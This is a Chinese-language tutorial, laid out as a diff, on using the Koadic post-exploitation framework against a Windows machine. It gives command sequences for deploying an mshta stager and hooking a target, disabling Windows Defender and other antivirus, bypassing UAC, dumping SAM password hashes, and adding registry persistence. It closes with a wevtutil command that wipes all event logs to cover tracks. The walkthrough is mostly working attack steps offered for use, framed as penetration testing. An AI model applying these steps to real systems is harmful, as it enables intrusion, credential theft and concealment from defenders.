@@ -1,0 +1,172 @@
+
+
+
+    渗透测试大致可以分为以下五个阶段：侦察、扫描、获得访问权限、维护访问/持久性、数据渗漏。Koadic是发布于DEFCON上的一个后渗透工具，它可用于以上列举的最后两个阶段，即权限维持和数据渗漏。
+
+    利用Windows脚本宿主，Koadic提供类似于批处理文件的脚本功能。正因如此，它可以在包括Windows 10在内的多个Windows环境中使用。
+
+    为了躲避杀毒软件的查杀，Koadic被设计为在内存中运行，这也显著降低了被查杀的可能性。此外，它还会通过SSL和TLS来加密保护通信流量。
+
+
+安装
+    安装Koadic只需在终端上运行以下命令即可：
+    git clone https://github.com/zerosum0x0/koadic.git
+
+    导航到安装目录并运行Koadic：
+    ./koadic
+
+
+    以下列出了Koadic中当前可用的主要命令及其功能。
+
+        Command Description
+
+        edit: shell out to an editor for the current module
+        listeners: shows info about stagers
+        sounds: turn sounds off/on: sound(0|1)
+        help: displays help info for a command
+        kill: kill a job or all jobs
+        exit: exits the program
+        cmdshell: command shell to interact with a zombie
+        verbose: turn verbosity off/on: verbose (0|1)
+        creds: shows collected credentials
+        unset: unsets a variable for the current module
+        api: turn off/on the rest api
+        taco: taco time
+        load: reloads all modules
+        use: switch to a different module
+        info: shows the current module options
+        jobs: shows info about jobs
+        pyexec: evals some python
+        domain: shows collected domain information
+        set: sets a variable for the current module
+        run: runs the current module
+        zombies: lists hooked targets
+
+
+
+        你可以在终端上输入help来查看这些命令
+
+
+        KOADIC 模块
+        Koadic有几个内置模块，“stager/js/mshta”是首次执行该工具时的默认配置模块。你可以通过“info”命令来查看并配置模块。
+        $ info
+
+
+        以上显示了用户需要配置的所有字段，以充分利用stager及目标机器。
+
+
+        查看Koadic上可用的所有模块，请输入“use”，然后双击Tab键。
+        你可以在使用工具期间，通过单击Tab键来自动补齐命令或显示给定命令的可用选项。
+
+        在本文中，我将演示如何使用stager连接到Zombie机器，关闭所有防病毒软件，执行权限提升，收集有用信息并在机器上保持持久性，然后安全的渗漏数据。通过该简单演示，你将对Koadic的功能及其使用方法有一个大致的了解。
+
+
+
+# STAGER 使用
+
+    多年来，Windows一直在不断加强其自身的防御能力。因此，Windows Defender可以直接检测和阻止大多数的stagers。出于这个原因，我们将使用默认配置的mshta stager，因为它被检测和阻止的概率是最低的，甚至它可以在某些最新版本的Windows 10上运行。
+
+    要查看我们应该为stager提供的参数信息，请运行：
+    $ info
+
+
+
+    从上图可以看出，我们必须设置SRVHOST和SRVPORT参数才能使用satger。运行以下命令，用你自己的IP替换IP和端口号：
+    set SRVHOST 本机真实IP
+    set SRVPORT 端口号
+    $ run
+    执行时，Koadic会在stager log中指定的地址生成一个stager，如下所示。
+
+
+    复制日志底部生成的命令并在目标计算机上运行。cmd 命令行
+
+
+    一个zombie机器被创建，目标机器现在已连接到了mshta stager server。
+    立即创建僵尸，目标机器现在连接到mshta stager服务器。
+    你可以运行以下命令进行确认：
+    $ zombies
+
+
+# “杀死”防毒软件
+
+    下一步是杀死windows defender和所有其他正在运行的防病毒软件，以确保我们可以在目标计算机上执行任何我们想要执行的命令。你只需简单的运行以下命令即可：
+    $ use implant/manage/killav
+    $ info
+    $ set zombie 0
+    要确认模块是否已成功执行，请运行：
+    $ zombies 0
+
+
+权限提升
+    提权是一个非常重要的阶段，一旦成功我们就可以以管理员身份完全的访问计算机，并且还将获取更改计算机关键设置的权限。
+    为此，我们可以尝试使用Koadic上的模块来绕过UAC（用户帐户控制）。成功率取决于目标机器的Windows版本，因为有些可能已经被修补。
+    让我们使用implant/elevate/bypassuac_compdefaults，命令如下：
+
+    $ use implant/elevate/bypassuac_compdefaults
+    $ info
+    $ listeners
+    $ set payload 0
+    $ run
+    “listeners”命令将列出所有正在运行的侦听程序，这些侦听程序也被称为payloads。
+
+    运行以下命令确认模块是否已被成功执行：
+    $ zombies
+
+
+    可以看到一个新的zombie已被创建ID为1*。星号表示zombie正在以提升后的权限运行。
+    键入并运行：
+    $ zombies 1
+    显示zombie的详细信息，以验证其权限状态。
+
+    现在，我们可以使用“implant/manage/exec_cmd”在CMD上运行任何Windows命令。
+    让我们尝试使用以下命令：
+
+    $ use implant/manage/exec_cmd
+    $ info
+    $ set zombie 1
+    $ run
+
+
+“hostname”命令在目标机器上执行，将返回机器的名称。
+
+将CMD参数更改为“whoami”会返回我们正在运行的用户的名称，这里“user”为Admin用户，如下所示。
+
+
+INTEL RAID/持久性和数据渗漏
+
+    收集目标任何有价值的信息，我想是最激动和不可或缺的一个阶段。这里，我将使用“implant/gather/hashdump_sam”模块，来获取目标计算机上的哈希值。命令如下：
+
+    $ use implant/gather/hashdump_sam
+    $ info
+    $ set getsyshive true
+    $ run
+
+
+    收集到的哈希值如下所示。
+
+    在目标机器上保持持久性同样重要，这样我们就可以长期监控目标机器，并进一步的获取有价值的信息。
+
+    让我们使用”implant/persist/registry”模块，运行以下命令：
+
+    $ use implant/persist/registry
+    $ info
+    $ listeners
+    $ set payload 0
+    $ set zombie 1
+    $ run
+
+
+    使用该模块，我们可以将“CLEANUP”参数设置为“true”以删除注册表项，从而隐藏我们的轨迹。
+    对于刚刚我们获取哈希值的操作，可以运行“for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1″”命令，使用“implant/manage/exec_cmd”模块来清除所有事件日志。命令如下：
+    use implant/manage/exec_cmd
+    info
+    set zombie 1
+    set CMD for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1”
+    run
+
+
+
+
+
+
+
